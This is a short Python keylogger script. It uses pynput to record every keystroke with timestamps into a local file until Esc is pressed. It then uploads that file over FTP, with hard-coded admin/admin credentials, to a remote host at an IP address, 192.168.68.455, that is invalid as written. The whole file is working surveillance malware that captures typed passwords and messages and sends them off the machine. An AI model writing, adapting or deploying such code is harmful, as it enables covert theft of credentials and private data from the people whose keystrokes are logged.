from pynput.keyboard import Key,Listener
import ftplib
import logging

logdir=""

logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")

def pressing_key(Key): # real signature unknown
    try:
        logging.info(str(Key))

    except AttributeError:
        print("A special Key {0} has been pressed ".format(Key))


def releasing_key(key): # real signature unknown
    if key==Key.esc:
        return False

print("\nStarted Listening....\n")

with Listener(on_press=pressing_key,on_release=releasing_key) as listener:
    listener.join()

print("\COnnecting o FTP and sending and sending the data.....")

sess=ftplib.FTP("192.168.68.455","admin","admin")

file=open("klog-res.txt","rb")
sess.storbinary("STOR klog-res.txt",file)
file.close()
sess.close()





